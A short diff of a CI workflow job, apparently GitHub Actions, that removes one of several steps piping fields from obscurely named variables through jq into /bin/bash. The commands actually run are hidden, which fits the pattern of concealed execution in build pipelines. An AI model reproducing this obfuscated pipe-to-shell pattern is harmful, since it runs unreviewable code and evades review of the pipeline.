@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$nwzl579" | jq -r .oue714 | /bin/bash
           echo $vxf2 | jq -r .ez67823 | /bin/bash
-          echo $dqsbc3 | jq -r .s686 | /bin/bash
           printf '%s' "$ho93832" | jq -r .ml018 | /bin/bash
 
       - name: Save archive
